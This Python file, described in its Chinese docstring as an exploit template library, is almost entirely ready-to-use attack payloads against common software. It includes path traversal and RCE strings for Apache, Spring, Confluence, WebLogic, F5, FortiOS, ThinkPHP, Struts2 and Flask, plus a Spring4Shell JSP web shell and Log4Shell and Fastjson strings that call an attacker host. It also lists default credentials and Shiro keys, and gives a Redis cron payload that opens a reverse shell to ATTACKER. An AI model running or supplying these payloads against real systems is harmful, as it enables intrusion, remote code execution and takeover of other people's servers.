#!/usr/bin/env python3
"""
漏洞利用模板库 - 常见漏洞的完整利用Payload
包含: CVE漏洞利用, 框架漏洞, 中间件漏洞等
"""

from typing import Dict, List


class ExploitTemplates:
    """漏洞利用模板"""
    
    # ==================== CVE漏洞利用 ====================
    CVE_EXPLOITS = {
        # Apache
        "CVE-2021-41773": {
            "name": "Apache 2.4.49 Path Traversal",
            "severity": "critical",
            "payloads": [
                "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
            ],
            "rce_payload": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh",
            "method": "GET",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "echo;id"
        },
        "CVE-2021-42013": {
            "name": "Apache 2.4.50 Path Traversal",
            "severity": "critical",
            "payloads": [
                "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
                "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
            ],
            "method": "POST"
        },
        
        # Spring
        "CVE-2022-22965": {
            "name": "Spring4Shell RCE",
            "severity": "critical",
            "payloads": [
                "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();int a=-1;byte[]b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%{suffix}i",
                "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
                "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
                "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell",
                "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
            ],
            "method": "POST"
        },
        "CVE-2022-22963": {
            "name": "Spring Cloud Function SpEL RCE",
            "severity": "critical",
            "payloads": [
                'T(java.lang.Runtime).getRuntime().exec("id")',
                'T(java.lang.Runtime).getRuntime().exec("whoami")',
            ],
            "path": "/functionRouter",
            "method": "POST",
            "headers": {"spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec(\"id\")"}
        },
        
        # Log4j
        "CVE-2021-44228": {
            "name": "Log4j RCE (Log4Shell)",
            "severity": "critical",
            "payloads": [
                "${jndi:ldap://ATTACKER/a}",
                "${jndi:rmi://ATTACKER/a}",
                "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://ATTACKER/a}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ATTACKER/a}",
                "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//ATTACKER/a}",
                "${${lower:j}ndi:${lower:l}dap://ATTACKER/a}",
            ],
            "injection_points": ["User-Agent", "X-Forwarded-For", "Referer", "Cookie", "X-Api-Version"]
        },
        
        # Confluence
        "CVE-2022-26134": {
            "name": "Confluence OGNL Injection RCE",
            "severity": "critical",
            "payloads": [
                "/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))}/",
            ],
            "method": "GET"
        },
        "CVE-2023-22515": {
            "name": "Confluence Broken Access Control",
            "severity": "critical",
            "payloads": [
                "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",
                "/setup/setupadministrator.action",
            ],
            "method": "GET"
        },
        
        # GitLab
        "CVE-2021-22205": {
            "name": "GitLab ExifTool RCE",
            "severity": "critical",
            "payloads": [
                # DjVu文件利用
            ],
            "description": "通过上传恶意图片触发ExifTool命令执行"
        },
        
        # WebLogic
        "CVE-2020-14882": {
            "name": "WebLogic Console RCE",
            "severity": "critical",
            "payloads": [
                "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22)",
                "/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1",
            ],
            "method": "GET"
        },
        "CVE-2023-21839": {
            "name": "WebLogic T3/IIOP RCE",
            "severity": "critical",
            "port": 7001,
            "description": "T3协议反序列化漏洞"
        },
        
        # vCenter
        "CVE-2021-21972": {
            "name": "VMware vCenter RCE",
            "severity": "critical",
            "payloads": [
                "/ui/vropspluginui/rest/services/uploadova",
            ],
            "method": "POST"
        },
        
        # F5 BIG-IP
        "CVE-2022-1388": {
            "name": "F5 BIG-IP Auth Bypass RCE",
            "severity": "critical",
            "path": "/mgmt/tm/util/bash",
            "method": "POST",
            "headers": {
                "X-F5-Auth-Token": "",
                "Authorization": "Basic YWRtaW46",
                "Connection": "X-F5-Auth-Token"
            },
            "body": '{"command":"run","utilCmdArgs":"-c id"}'
        },
        
        # Fortinet
        "CVE-2022-40684": {
            "name": "FortiOS Auth Bypass",
            "severity": "critical",
            "path": "/api/v2/cmdb/system/admin/admin",
            "method": "PUT",
            "headers": {"Forwarded": "for=\"[127.0.0.1]:8000\";by=\"[127.0.0.1]:9000\";"}
        },
        
        # Microsoft Exchange (ProxyShell)
        "CVE-2021-34473": {
            "name": "Exchange ProxyShell SSRF",
            "severity": "critical",
            "payloads": [
                "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com",
            ]
        },
        
        # ThinkPHP
        "CVE-2018-20062": {
            "name": "ThinkPHP 5.x RCE",
            "severity": "critical",
            "payloads": [
                "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
                "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
                "/?s=index/\\think\\Request/input&filter=phpinfo&data=1",
                "/?s=index/\\think\\Request/input&filter=system&data=id",
                "/?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=<?php phpinfo();?>",
            ]
        },
        
        # Shiro
        "CVE-2016-4437": {
            "name": "Apache Shiro RememberMe反序列化",
            "severity": "critical",
            "description": "Shiro默认密钥反序列化",
            "default_keys": [
                "kPH+bIxk5D2deZiIxcaaaA==",
                "4AvVhmFLUs0KTA3Kprsdag==",
                "Z3VucwAAAAAAAAAAAAAAAA==",
                "fCq+/xW488hMTCD+cmJ3aQ==",
                "0AvVhmFLUs0KTA3Kprsdag==",
                "1AvVhdsgUs0FSA3SDFAdag==",
                "1QWLxg+NYmxraMoxAXu/Iw==",
                "25BsmdYwjnfcWmnhAciDDg==",
                "2AvVhdsgUs0FSA3SDFAdag==",
            ]
        },
        
        # Fastjson
        "CVE-2022-25845": {
            "name": "Fastjson AutoType Bypass RCE",
            "severity": "critical",
            "payloads": [
                '{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker/Exploit","autoCommit":true}',
                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
                '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}}',
            ]
        },
        
        # Jenkins
        "CVE-2024-23897": {
            "name": "Jenkins CLI Arbitrary File Read",
            "severity": "critical",
            "description": "通过Jenkins CLI读取任意文件",
            "payloads": [
                "java -jar jenkins-cli.jar -s http://target/ help @/etc/passwd",
            ]
        },
        
        # Redis
        "CVE-2022-0543": {
            "name": "Redis Lua Sandbox Escape",
            "severity": "critical",
            "payloads": [
                'eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res\' 0',
            ]
        },
    }
    
    # ==================== 框架漏洞 ====================
    FRAMEWORK_EXPLOITS = {
        "struts2": {
            "S2-045": {
                "name": "Struts2 S2-045 RCE",
                "severity": "critical",
                "header": "Content-Type",
                "payload": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            },
            "S2-046": {
                "name": "Struts2 S2-046 RCE",
                "severity": "critical",
                "header": "Content-Disposition",
                "payload": 'filename="%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(\'S2-046\')).(#o.close())}\x00b"'
            },
            "S2-057": {
                "name": "Struts2 S2-057 RCE",
                "severity": "critical",
                "path": "/${(1+1)}/actionChain1.action",
            },
            "S2-061": {
                "name": "Struts2 S2-061 RCE",
                "severity": "critical",
                "payload": "%{('Powered_by_Unicode_Potats0,enjoy_telerik').valueOf()}"
            }
        },
        
        "spring": {
            "actuator": {
                "endpoints": [
                    "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
                    "/actuator/configprops", "/actuator/beans", "/actuator/mappings",
                    "/actuator/heapdump", "/actuator/threaddump", "/actuator/loggers",
                    "/actuator/jolokia", "/actuator/gateway/routes",
                    "/env", "/health", "/info", "/beans", "/mappings", "/heapdump",
                ],
                "rce_endpoints": [
                    "/actuator/gateway/routes", "/actuator/jolokia",
                    "/actuator/env", "/actuator/refresh",
                ]
            },
            "cloud_gateway_rce": {
                "path": "/actuator/gateway/routes/hacktest",
                "method": "POST",
                "payload": {
                    "id": "hacktest",
                    "filters": [{
                        "name": "AddResponseHeader",
                        "args": {
                            "name": "Result",
                            "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
                        }
                    }],
                    "uri": "http://example.com"
                }
            }
        },
        
        "laravel": {
            "debug_rce": {
                "path": "/_ignition/execute-solution",
                "method": "POST",
                "payload": {
                    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                    "parameters": {
                        "variableName": "username",
                        "viewFile": "phar://path/to/phar"
                    }
                }
            }
        },
        
        "thinkphp": {
            "v5_rce": [
                "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
                "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami",
                "/?s=index/\\think\\Request/input&filter[]=system&data=id",
                "/?s=index/\\think\\view\\driver\\Php/display&content=<?php phpinfo();?>",
                "/?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=<?php phpinfo();?>",
                "/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
            ]
        },
        
        "django": {
            "debug_info": ["/?__debugger__=yes", "/admin/"],
            "ssti": ["{{7*7}}", "{% debug %}"]
        },
        
        "flask": {
            "ssti": [
                "{{config}}", "{{config.items()}}", "{{request.environ}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ],
            "debug_pin": "/console"
        }
    }
    
    # ==================== 中间件漏洞 ====================
    MIDDLEWARE_EXPLOITS = {
        "tomcat": {
            "manager_default_creds": [
                ("tomcat", "tomcat"), ("admin", "admin"), ("manager", "manager"),
                ("tomcat", "s3cret"), ("admin", ""), ("tomcat", ""),
            ],
            "ajp_ghostcat": {
                "port": 8009,
                "payload": "AJP协议读取WEB-INF下文件"
            },
            "put_upload": {
                "method": "PUT",
                "path": "/test.jsp/",
            }
        },
        
        "weblogic": {
            "console_paths": ["/console", "/console/login/LoginForm.jsp"],
            "t3_ports": [7001, 7002],
            "default_creds": [
                ("weblogic", "weblogic"), ("weblogic", "weblogic1"),
                ("weblogic", "welcome1"), ("system", "password"),
            ]
        },
        
        "jboss": {
            "console_paths": [
                "/jmx-console/", "/web-console/", "/admin-console/",
                "/invoker/JMXInvokerServlet", "/invoker/EJBInvokerServlet",
            ],
            "default_creds": [("admin", "admin"), ("jboss", "jboss")]
        },
        
        "jenkins": {
            "paths": [
                "/", "/script", "/cli", "/computer/(master)/script",
                "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
            ],
            "groovy_rce": 'println "whoami".execute().text'
        },
        
        "elasticsearch": {
            "paths": ["/_cluster/health", "/_cat/indices", "/_nodes"],
            "groovy_rce": {
                "path": "/_search?pretty",
                "payload": '{"script_fields":{"exp":{"script":"java.lang.Runtime.getRuntime().exec(\"id\")"}}}'
            }
        },
        
        "redis": {
            "commands": [
                "INFO", "CONFIG GET *", "KEYS *", "GET *",
            ],
            "rce_payload": [
                'CONFIG SET dir /var/spool/cron/',
                'CONFIG SET dbfilename root',
                'SET x "\\n* * * * * bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\\n"',
                'SAVE'
            ]
        }
    }
    
    @classmethod
    def get_cve_exploit(cls, cve_id: str) -> Dict:
        """获取CVE漏洞利用"""
        return cls.CVE_EXPLOITS.get(cve_id.upper(), {})
    
    @classmethod
    def get_framework_exploit(cls, framework: str) -> Dict:
        """获取框架漏洞利用"""
        return cls.FRAMEWORK_EXPLOITS.get(framework.lower(), {})
    
    @classmethod
    def get_middleware_exploit(cls, middleware: str) -> Dict:
        """获取中间件漏洞利用"""
        return cls.MIDDLEWARE_EXPLOITS.get(middleware.lower(), {})
    
    @classmethod
    def list_cves(cls) -> List[str]:
        """列出所有CVE"""
        return list(cls.CVE_EXPLOITS.keys())
    
    @classmethod
    def list_frameworks(cls) -> List[str]:
        """列出所有框架"""
        return list(cls.FRAMEWORK_EXPLOITS.keys())
    
    @classmethod
    def count(cls) -> Dict:
        """统计数量"""
        return {
            "cve_exploits": len(cls.CVE_EXPLOITS),
            "framework_exploits": len(cls.FRAMEWORK_EXPLOITS),
            "middleware_exploits": len(cls.MIDDLEWARE_EXPLOITS),
        }
